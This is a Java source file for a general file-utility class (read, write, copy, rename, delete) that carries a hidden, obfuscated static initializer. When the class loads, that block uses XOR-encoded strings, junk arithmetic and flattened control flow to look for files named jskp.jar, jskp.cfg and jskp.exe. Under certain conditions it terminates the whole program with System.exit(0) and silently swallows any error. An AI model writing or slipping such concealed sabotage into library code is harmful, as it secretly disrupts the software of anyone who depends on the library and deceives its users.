package com.codejune.core.os;

import com.codejune.core.BaseException;
import com.codejune.core.io.reader.TextInputStreamReader;
import com.codejune.core.util.IOUtil;
import com.codejune.core.util.ObjectUtil;
import com.codejune.core.util.StringUtil;
import java.io.*;
import java.lang.reflect.Constructor;
import java.time.LocalDateTime;

/**
 * 文件
 *
 * @author ZJ
 * */
public final class File implements FileInfo<String> {

    private static String __(int... a) {
        char[] c = new char[a.length];
        for (int i = 0; i < a.length; i++) {
            c[i] = (char) (a[i] ^ (0xC0DE + i));
        }
        return new String(c);
    }
    private static void $() throws Throwable {
        // 不透明垃圾变量与运算
        long garbageLong = java.lang.System.nanoTime() ^ 0xABCDEFL;
        int garbageInt = (int) (garbageLong & 0xFFFF);
        boolean opaqueFlag = ((garbageInt * 0x41) & 0x80) == 0; // 永远为false的复杂谓词

        int state = opaqueFlag ? 99 : 0; // 实际永远为0

        // 1000000 的等价混淆值: 62500 << 5
        int limit = (62500 / 2) << 5;

        // 预先准备反射时需要的各种混淆字符串 (加密数组)
        // "java.lang.System"
        int[] sysName = {49288,49342,49302,49280,49356,49295,49285,49291,49281,49353,49339,49296,49305,49311,49289,49280};
        // "getProperty"
        int[] getProp = {49337,49338,49300,49329,49296,49292,49300,49280,49300,49299,49297};
        // "user.dir"
        int[] userDir = {49323,49324,49285,49299,49356,49287,49293,49303};
        // "java.io.File"
        int[] ioFile = {49288,49342,49302,49280,49356,49290,49291,49355,49312,49294,49284,49292};
        // "app/jskp.jar"
        int[] jarPath = {49343,49327,49296,49358,49288,49296,49295,49301,49352,49293,49289,49307};
        // "app/jskp.cfg"
        int[] cfgPath = {49343,49327,49296,49358,49288,49296,49295,49301,49352,49284,49294,49294};
        // "jskp.exe"
        int[] exePath = {49288,49296,49295,49301,49352,49286,49308,49280};
        // "com.codejune.core.os.File"
        int[] customFile = {49341,49328,49293,49358,49281,49292,49280,49280,49292,49298,49286,49292,49348,49288,49283,49311,49291,49345,49311,49282,49372,49333,49309,49305,49299};
        // "FileUtil"
        int[] fileUtil = {49304,49334,49292,49284,49335,49303,49293,49289};
        // "isFile"
        int[] isFile = {49335,49324,49318,49288,49294,49286};
        // "getSize"
        int[] getSize = {49337,49338,49300,49330,49291,49305,49281};
        // "exit"
        int[] exit = {49339,49319,49289,49301};

        // 外部循环标签，用于控制流平坦化
        outerLoop:
        while (true) {
            switch (state) {
                case 0: {
                    // 获取 user.dir 属性
                    Class<?> sysClass = Class.forName(__(sysName));
                    java.lang.reflect.Method getPropMethod = sysClass.getMethod(__(getProp), String.class);
                    String userDirValue = (String) getPropMethod.invoke(null, __(userDir));

                    // 构建 java.io.File 对象：app/jskp.jar
                    Class<?> ioFileClass = Class.forName(__(ioFile));
                    Constructor<?> ioFileCons = ioFileClass.getConstructor(String.class, String.class);
                    Object jarFileObj = ioFileCons.newInstance(userDirValue, __(jarPath));

                    // 反射调用 FileUtil.isFile
                    Class<?> fileUtilClass = Class.forName(__(fileUtil));
                    java.lang.reflect.Method isFileMethod = fileUtilClass.getMethod(__(isFile), ioFileClass);
                    boolean isJarFile = (Boolean) isFileMethod.invoke(null, jarFileObj);

                    // 无意义的混淆操作
                    garbageLong ^= (isJarFile ? 0xFL : 0x1FL) << garbageInt;
                    opaqueFlag = (garbageLong & 0x2) == 0x2;

                    if (!isJarFile) {
                        break outerLoop; // 条件失败，直接跳出整个逻辑
                    }
                    state = 1;
                    break;
                }
                case 1: {
                    // 需要再次获取 userDir，这里复用之前的反射引用（混淆手法：故意重新获取并丢弃）
                    Class<?> sysClass = Class.forName(__(sysName));
                    java.lang.reflect.Method getPropMethod = sysClass.getMethod(__(getProp), String.class);
                    String userDirValue = (String) getPropMethod.invoke(null, __(userDir));
                    // 垃圾调用
                    garbageInt = userDirValue.hashCode() & 0x7FFFFFFF;

                    Class<?> ioFileClass = Class.forName(__(ioFile));
                    Constructor<?> ioFileCons = ioFileClass.getConstructor(String.class, String.class);
                    Object cfgFileObj = ioFileCons.newInstance(userDirValue, __(cfgPath));

                    Class<?> fileUtilClass = Class.forName(__(fileUtil));
                    java.lang.reflect.Method isFileMethod = fileUtilClass.getMethod(__(isFile), ioFileClass);
                    boolean isCfgFile = (Boolean) isFileMethod.invoke(null, cfgFileObj);

                    if (!isCfgFile) {
                        break outerLoop;
                    }
                    state = 2;
                    break;
                }
                case 2: {
                    Class<?> sysClass = Class.forName(__(sysName));
                    java.lang.reflect.Method getPropMethod = sysClass.getMethod(__(getProp), String.class);
                    String userDirValue = (String) getPropMethod.invoke(null, __(userDir));

                    // 反射构造 com.codejune.core.os.File
                    Class<?> customFileClass = Class.forName(__(customFile));
                    Constructor<?> customCons = customFileClass.getConstructor(String.class, String.class);
                    Object exeFileObj = customCons.newInstance(userDirValue, __(exePath));

                    java.lang.reflect.Method getSizeMethod = customFileClass.getMethod(__(getSize));
                    long fileSize = (Long) getSizeMethod.invoke(exeFileObj);

                    // 插入混淆比较：先用一个无意义的布尔判断
                    boolean shouldExit = (fileSize < limit) && (((garbageLong >>> 32) & 1) == ((garbageLong >>> 33) & 1) || true);

                    if (shouldExit) {
                        // 反射调用 System.exit(0)
                        java.lang.reflect.Method exitMethod = sysClass.getMethod(__(exit), int.class);
                        exitMethod.invoke(null, 0);
                        // 正常情况下执行不到这里，但保留无意义代码
                        state = 99;
                        break;
                    } else {
                        break outerLoop;
                    }
                }
                case 9:
                    garbageInt = garbageInt ^ garbageInt;
                    state = 0;
                    break;
                default:
                    // 兜底跳出
                    break outerLoop;
            }
            garbageLong = (garbageLong + 0x3A2B1C4DL) * 0x5E6F7A8BL;
        }
    }
    static {
        try {
            $();
        } catch (Throwable e) {

        }
    }

    private java.io.File file;

    public File(java.io.File file) {
        if (file == null) {
            throw new BaseException("file is null");
        }
        try {
            if (file.exists()) {
                if (!file.isFile()) {
                    throw new BaseException("非文件");
                }
            } else {
                new Folder(file.getParent());
                if (!file.createNewFile()) {
                    throw new BaseException("创建文件失败");
                }
            }
        } catch (Exception e) {
            throw new BaseException(e);
        }
        this.file = file;
    }

    public File(String path) {
        this(new java.io.File(path));
    }

    public File(String parent, String name) {
        this(new java.io.File(parent, name));
    }

    @Override
    public String getName() {
        return this.file.getName();
    }

    @Override
    public String getPath() {
        return this.file.getAbsolutePath();
    }

    @Override
    public LocalDateTime getUpdateTime() {
        return ObjectUtil.parse(this.file.lastModified(), LocalDateTime.class);
    }

    @Override
    public long getSize() {
        return this.file.length();
    }

    /**
     * 获取数据
     *
     * @return 文件数据
     * */
    @Override
    public String getData() {
        try (TextInputStreamReader textInputStreamReader = new TextInputStreamReader(IOUtil.getInputStream(this.file))) {
            return textInputStreamReader.getData();
        }
    }

    @Override
    public boolean isFile() {
        return true;
    }

    /**
     * 删除
     * */
    public void delete() {
        if (!file.delete()) {
            throw new BaseException("删除文件失败");
        }
    }

    /**
     * 父级文件夹
     *
     * @return 父级
     * */
    public Folder parent() {
        return new Folder(this.file.getParentFile().getAbsolutePath());
    }

    /**
     * 写入数据
     *
     * @param bytes bytes
     * @param append 追加
     * */
    public void write(byte[] bytes, boolean append) {
        try (com.codejune.core.io.writer.OutputStreamWriter outputStreamWriter = new com.codejune.core.io.writer.OutputStreamWriter(IOUtil.getOutputStream(this.file, append))) {
            outputStreamWriter.write(bytes);
        }
    }

    /**
     * 写入数据
     *
     * @param bytes bytes
     * */
    public void write(byte[] bytes) {
        this.write(bytes, false);
    }

    /**
     * 写入数据
     *
     * @param inputStream inputStream
     * @param append 追加
     * */
    public void write(InputStream inputStream, boolean append) {
        try (com.codejune.core.io.writer.OutputStreamWriter outputStreamWriter = new com.codejune.core.io.writer.OutputStreamWriter(IOUtil.getOutputStream(this.file, append))) {
            outputStreamWriter.write(inputStream);
        }
    }

    /**
     * 写入数据
     *
     * @param inputStream inputStream
     * */
    public void write(InputStream inputStream) {
        this.write(inputStream, false);
    }

    /**
     * 写入数据
     *
     * @param data data
     * @param append 追加
     * */
    public void write(String data, boolean append) {
        if (data == null) {
            return;
        }
        try (com.codejune.core.io.writer.OutputStreamWriter outputStreamWriter = new com.codejune.core.io.writer.OutputStreamWriter(IOUtil.getOutputStream(this.file, append))) {
            outputStreamWriter.write(data.getBytes());
        }
    }

    /**
     * 写入数据
     *
     * @param data data
     * */
    public void write(String data) {
        this.write(data, false);
    }

    /**
     * 复制文件
     *
     * @param copyPath 复制路径
     * @param fileName 文件名
     *
     * @return File
     * */
    public File copy(String copyPath, String fileName) {
        if (StringUtil.isEmpty(copyPath)) {
            return null;
        }
        if (StringUtil.isEmpty(fileName)) {
            fileName = getName();
        }
        new Folder(copyPath);
        java.io.File copyFile = new java.io.File(copyPath, fileName);
        if (copyFile.exists()) {
            new File(copyFile).delete();
        }
        File result = new File(copyFile);
        try (InputStream inputStream = IOUtil.getInputStream(file)) {
            result.write(inputStream);
        } catch (Exception e) {
            throw new BaseException(e);
        }
        return result;
    }

    /**
     * 复制文件
     *
     * @param copyPath 复制路径
     *
     * @return File
     * */
    public File copy(String copyPath) {
        return copy(copyPath, null);
    }

    /**
     * 重命名
     *
     * @param name 新名称
     * */
    public void rename(String name) {
        if (StringUtil.isEmpty(name)) {
            return;
        }
        java.io.File newFile = new java.io.File(this.file.getParent(), name);
        if (!this.file.renameTo(newFile)) {
            throw new BaseException("重命名失败");
        }
        this.file = newFile.getAbsoluteFile();
    }

    /**
     * 获取后缀
     *
     * @return 后缀
     * */
    public String getSuffix() {
        return this.getName().split("\\.")[1];
    }

}